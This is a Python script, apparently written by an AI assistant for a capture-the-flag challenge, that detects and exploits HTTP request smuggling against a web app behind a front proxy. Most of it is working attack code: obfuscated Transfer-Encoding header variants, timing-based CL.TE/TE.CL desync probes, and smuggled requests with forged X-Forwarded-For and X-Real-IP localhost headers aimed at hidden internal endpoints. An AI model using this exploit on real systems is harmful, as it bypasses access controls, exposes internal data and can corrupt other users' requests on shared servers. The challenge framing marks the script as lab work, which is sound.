#!/usr/bin/env python3
"""
Coffee Shop (HI Cyber Con 2026) — HTTP request-smuggling probe & exploit helper.

Run this from YOUR machine (direct connection to the live instance), because it
needs raw byte-level control of the HTTP/1.1 stream that a sandboxed/proxied
environment can't provide.

Theory of the bug (to verify): the "head roaster's private after-hours ledger"
is an endpoint the PHP app serves only to "internal" requests (it trusts a
header like X-Forwarded-For / X-Real-IP, or REMOTE_ADDR). The instancer
front-proxy rewrites/strips those headers on normal traffic, so you get
"Not found" externally. If the front (proxy) and back (Apache 2.4.69) disagree
on request boundaries (CL.TE / TE.CL desync), we can smuggle a second request
carrying our OWN internal headers straight to Apache and read the ledger.

Usage:
  # 1) Detect a desync (spin a FRESH instance first, pass its host):
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net detect

  # 2) If a desync is found, smuggle requests to candidate ledger routes:
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net exploit CL.TE
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net exploit TE.CL

  # Optional: probe one explicit smuggled target line, e.g.:
  python3 smuggle_probe.py <host> exploit CL.TE "/?api=ledger"

Paste the full output back to me and we iterate.

NOTE: only run against your own CTF instance. Smuggling can disturb other
requests on a shared backend; a per-user CTF instance is fine.
"""
import socket, ssl, sys, time

PORT = 443
TIMEOUT = 12          # seconds; a hung backend (desync) shows up as ~TIMEOUT
TRIALS = 3            # repeat timing tests to average out jitter

# ---- header-obfuscation variants to make front & back disagree on TE ----
# Each is a (label, Transfer-Encoding header line) pair.
TE_VARIANTS = [
    ("plain",        "Transfer-Encoding: chunked"),
    ("space-before", "Transfer-Encoding : chunked"),
    ("tab",          "Transfer-Encoding:\tchunked"),
    ("leading-sp",   " Transfer-Encoding: chunked"),
    ("vtab",         "Transfer-Encoding:\x0bchunked"),
    ("x-prefix",     "X: X\r\nTransfer-Encoding: chunked"),
    ("dup",          "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked"),
    ("nl-value",     "Transfer-Encoding:\nchunked"),
    ("caps",         "Transfer-Encoding: CHUNKED"),
]

def connect(host, alpn_h1_only=True):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Force HTTP/1.1 at the TLS layer; if the front only offers h2 this still
    # usually falls back to h1 for our raw bytes.
    try:
        ctx.set_alpn_protocols(["http/1.1"] if alpn_h1_only else ["h2", "http/1.1"])
    except NotImplementedError:
        pass
    raw = socket.create_connection((host, PORT), timeout=TIMEOUT)
    s = ctx.wrap_socket(raw, server_hostname=host)
    return s

def send_recv(host, payload, read_timeout=TIMEOUT):
    """Send raw bytes, return (elapsed_seconds, response_bytes, negotiated_alpn)."""
    s = connect(host)
    alpn = s.selected_alpn_protocol()
    s.settimeout(read_timeout)
    start = time.time()
    s.sendall(payload)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            # stop early once we clearly have a full first response
            if b"\r\n\r\n" in data and len(data) > 0 and b"HTTP/1." in data[:16]:
                # try to read a bit more but don't block long
                s.settimeout(1.5)
    except (socket.timeout, ssl.SSLError):
        pass
    except Exception:
        pass
    elapsed = time.time() - start
    try: s.close()
    except Exception: pass
    return elapsed, data, alpn

def clte_payload(host, te_line):
    # Front uses Content-Length(=4) -> forwards "1\r\nA"; back uses TE ->
    # reads chunk '1'/'A' then waits forever for the next chunk => delay.
    body = "1\r\nA\r\nX"
    hdr = (f"POST / HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"{te_line}\r\n"
           f"Content-Length: 4\r\n"
           f"Connection: keep-alive\r\n\r\n")
    return (hdr + body).encode()

def tecl_payload(host, te_line):
    # Front uses TE -> ends body at "0\r\n\r\n"; back uses Content-Length(=6)
    # -> waits for 6 bytes it never fully gets => delay.
    body = "0\r\n\r\nX"
    hdr = (f"POST / HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"{te_line}\r\n"
           f"Content-Length: 6\r\n"
           f"Connection: keep-alive\r\n\r\n")
    return (hdr + body).encode()

def baseline(host):
    body = "x"
    p = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(body)}\r\n"
         f"Connection: keep-alive\r\n\r\n{body}").encode()
    times = []
    alpn = None
    for _ in range(TRIALS):
        t, d, alpn = send_recv(host, p)
        times.append(t)
    return min(times), alpn

def detect(host):
    print(f"[*] Target: {host}:{PORT}")
    base, alpn = baseline(host)
    print(f"[*] Negotiated ALPN: {alpn or '(none / http1.1)'}")
    print(f"[*] Baseline response time: {base:.2f}s")
    if alpn == "h2":
        print("[!] Front negotiated HTTP/2 even though we asked for http/1.1.")
        print("    Classic CL.TE/TE.CL may not apply; h2-downgrade smuggling may be needed.")
    print(f"[*] A variant is INTERESTING if its time >> baseline (approaching {TIMEOUT}s).\n")
    findings = []
    for kind, mk in (("CL.TE", clte_payload), ("TE.CL", tecl_payload)):
        for label, te in TE_VARIANTS:
            best = min(send_recv(host, mk(host, te))[0] for _ in range(TRIALS))
            flag = "  <<< POSSIBLE DESYNC" if best > base + 4 and best > 5 else ""
            print(f"  [{kind:5}] {label:12} {best:5.2f}s{flag}")
            if flag:
                findings.append((kind, label, te, best))
        print()
    if findings:
        print("[+] Candidate desyncs found:")
        for kind, label, te, t in findings:
            print(f"    {kind} via '{label}'  ({t:.2f}s)  TE line: {te!r}")
        print("\n    Next: run  exploit <KIND>  to smuggle ledger-route requests.")
    else:
        print("[-] No timing desync detected. The bug is probably NOT request smuggling;")
        print("    tell me and we'll pivot (likely needs the challenge source).")
    return findings

# candidate hidden/internal endpoints to try via the smuggled request
CANDIDATES = [
    "/?api=ledger", "/?api=orders", "/?api=admin", "/?api=roaster",
    "/?api=books", "/?api=audit", "/?api=report", "/?api=afterhours",
    "/?api=order&all=1", "/?api=order&list=1", "/ledger", "/roaster",
    "/admin", "/internal", "/?api=ledger&after_hours=1",
]

def smuggle_once(host, kind, smuggled_request_line, extra_headers):
    """
    Build a CL.TE or TE.CL smuggle. The smuggled request carries internal
    headers (X-Forwarded-For/X-Real-IP = 127.0.0.1) to the BACKEND only.
    Then we send a normal follow-up request on the same connection and read
    what comes back (which may include the smuggled response).
    """
    smug = (f"{smuggled_request_line} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"X-Real-IP: 127.0.0.1\r\n"
            f"X-Forwarded-Host: localhost\r\n"
            f"{extra_headers}"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 0\r\n\r\n")
    if kind == "CL.TE":
        # front: CL (len of just the chunk framing); back: TE reads chunks then our smuggled req
        chunk = f"{len(smug):x}\r\n{smug}\r\n0\r\n\r\n"
        front_cl = len(chunk.split("\r\n", 1)[0]) + 2  # length of first chunk-size line
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                   f"Transfer-Encoding: chunked\r\n"
                   f"Content-Length: {front_cl}\r\n"
                   f"Connection: keep-alive\r\n\r\n{chunk}").encode()
    else:  # TE.CL
        # front: TE; back: CL. Body carries the smuggled request fully.
        body = smug
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: {len(body)}\r\n"
                   f"Transfer-Encoding: chunked\r\n"
                   f"Connection: keep-alive\r\n\r\n"
                   f"{len(body):x}\r\n{body}\r\n0\r\n\r\n").encode()
    t, d, _ = send_recv(host, payload, read_timeout=8)
    return d

def exploit(host, kind, only=None):
    print(f"[*] Smuggling via {kind} against {host}")
    targets = [only] if only else CANDIDATES
    for tgt in targets:
        try:
            resp = smuggle_once(host, kind, "GET " + tgt, "")
            txt = resp.decode("latin1", "replace")
            # surface anything that looks like a flag or non-"Not found" JSON
            interesting = any(k in txt for k in ("HI{", "hi{", "flag", "ledger", "token",
                                                 '"ok"', "authorization", "Authorization"))
            # strip to the last response on the connection (smuggled one often second)
            marker = "  <<< INTERESTING" if interesting else ""
            first = txt[:300].replace("\r", "")
            print(f"\n=== smuggled GET {tgt} ==={marker}")
            print(first)
            if "HI{" in txt or "hi{" in txt:
                import re
                for m in re.findall(r"[A-Za-z0-9_]*\{[^}]{3,}\}", txt):
                    print("  >>> POSSIBLE FLAG:", m)
        except Exception as e:
            print(f"=== {tgt} === error: {e}")
    print("\n[*] Done. Paste everything above back to me.")

def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    host = sys.argv[1].replace("https://", "").replace("http://", "").rstrip("/")
    mode = sys.argv[2]
    if mode == "detect":
        detect(host)
    elif mode == "exploit":
        kind = sys.argv[3] if len(sys.argv) > 3 else "CL.TE"
        only = sys.argv[4] if len(sys.argv) > 4 else None
        exploit(host, kind, only)
    else:
        print("mode must be 'detect' or 'exploit'"); sys.exit(1)

if __name__ == "__main__":
    main()
